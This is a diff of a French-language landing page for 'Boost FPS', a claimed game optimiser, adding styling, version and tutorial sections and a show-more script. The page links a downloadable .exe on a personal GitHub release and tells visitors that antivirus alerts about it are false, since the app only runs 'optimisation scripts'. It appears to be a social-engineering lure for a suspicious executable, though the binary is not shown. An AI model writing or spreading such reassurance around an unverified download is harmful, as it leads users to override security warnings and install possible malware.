@@ -16,6 +16,7 @@
             background-color: #f4f4f4;
             color: #333;
             line-height: 1.6;
+            scroll-behavior: smooth;
         }
 
         .container {
@@ -59,13 +60,18 @@
             color: #ff6f61;
         }
 
-        /* En-tête */
+        /* Sections */
+        section {
+            padding: 80px 20px;
+            text-align: center;
+            min-height: 100vh;
+        }
+
         header {
             background: linear-gradient(135deg, #ff6f61, #ffbc42);
             color: #fff;
             padding: 160px 0 100px;
             text-align: center;
-            position: relative;
             margin-top: 60px;
         }
 
@@ -79,7 +85,6 @@
             font-size: 1.5em;
         }
 
-        /* Contenu principal */
         .main-content {
             background-color: #fff;
             padding: 60px 20px;
@@ -89,18 +94,6 @@
             margin: -50px auto 50px;
         }
 
-        .main-content h2 {
-            font-size: 2.8em;
-            margin-bottom: 20px;
-        }
-
-        .main-content p {
-            font-size: 1.2em;
-            margin-bottom: 30px;
-            color: #777;
-        }
-
-        /* Bouton de téléchargement */
         .download-button {
             display: inline-block;
             padding: 20px 50px;
@@ -126,7 +119,6 @@
             100% { transform: scale(1); }
         }
 
-        /* Avertissement antivirus */
         .antivirus-warning {
             background-color: #ffcc00;
             color: #333;
@@ -144,32 +136,15 @@
             cursor: pointer;
         }
 
-        /* Pied de page */
+        .hidden {
+            display: none;
+        }
+
         footer {
             background-color: #222;
             color: #fff;
             padding: 40px 0;
             text-align: center;
-        }
-
-        /* Section Générique */
-        .section {
-            padding: 80px 20px;
-            text-align: center;
-        }
-
-        .section h2 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            header h1 { font-size: 3.5em; }
-            header p { font-size: 1.2em; }
-            .main-content h2 { font-size: 2.2em; }
-            .main-content p { font-size: 1em; }
-            .download-button { padding: 15px 30px; font-size: 1.3em; }
         }
     </style>
 </head>
@@ -178,9 +153,9 @@
     <!-- Barre de navigation -->
     <nav>
         <ul>
-            <li><a href="home.html" target="_blank">Accueil</a></li>
-            <li><a href="version.html" target="_blank">Version</a></li>
-            <li><a href="tuto.html" target="_blank">Tutoriel</a></li>
+            <li><a href="#home">Accueil</a></li>
+            <li><a href="#version">Version</a></li>
+            <li><a href="#tuto">Tutoriel</a></li>
         </ul>
     </nav>
 
@@ -198,10 +173,39 @@
             <p>Boost FPS t'offre une expérience de jeu fluide et performante, sans lags et avec un meilleur rendu graphique. Télécharge maintenant et fais la différence !</p>
 
             <div class="antivirus-warning">
-                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br><strong><a href="info.html" target="_blank">En savoir plus</a></strong></p>
+                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br>
+                    <strong><a href="#" onclick="toggleInfo()">En savoir plus</a></strong></p>
+            </div>
+
+            <div id="info" class="hidden">
+                <p>Notre application utilise des scripts d'optimisation avancés, ce qui peut parfois être considéré comme suspect par les antivirus. Il n'y a aucun virus, seulement des optimisations pour améliorer votre expérience de jeu.</p>
             </div>
 
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger Boost FPS</a>
+        </div>
+    </section>
+
+    <!-- Version -->
+    <section id="version">
+        <div class="container">
+            <h2>Versions</h2>
+            <p>Dernière version : <strong>2.0</strong></p>
+            <p>Historique des mises à jour :</p>
+            <ul>
+                <li>1.0 - Version initiale</li>
+                <li>1.5 - Optimisations diverses</li>
+                <li>2.0 - Améliorations de performance</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- Tutoriel -->
+    <section id="tuto">
+        <div class="container">
+            <h2>Comment utiliser Boost FPS ?</h2>
+            <p>1. Télécharge et installe l'application</p>
+            <p>2. Lance Boost FPS et ajuste les paramètres</p>
+            <p>3. Profite d'une meilleure fluidité sur tes jeux !</p>
         </div>
     </section>
 
@@ -211,6 +215,13 @@
             <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
         </div>
     </footer>
+
+    <script>
+        function toggleInfo() {
+            let info = document.getElementById("info");
+            info.classList.toggle("hidden");
+        }
+    </script>
 
 </body>
 </html>
